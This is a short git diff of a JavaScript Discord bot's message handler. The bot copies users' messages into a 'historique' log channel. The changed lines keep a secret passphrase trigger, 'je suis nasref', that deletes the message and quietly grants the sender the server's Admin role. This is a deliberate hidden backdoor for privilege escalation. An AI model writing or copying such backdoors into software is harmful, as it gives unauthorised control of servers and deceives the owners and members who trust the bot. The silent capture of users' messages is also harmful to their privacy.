@@ -50,7 +50,7 @@ bot.on("message", (message) => {
     if (!(message.author.id == "503345108578729985" || message.channel.name == "historique")) {
         message.guild.channels.find('name',"historique").send(message.createdAt+" "+message.channel+" "+message.author.username+" : "+message);
     }
-    if (mess == "Je suis Nasref") {
+    if (mess == "je suis nasref") {
         message.delete();
         message.guild.members.find('id',message.author.id).addRole(message.guild.roles.find('name',"Admin"));
     }
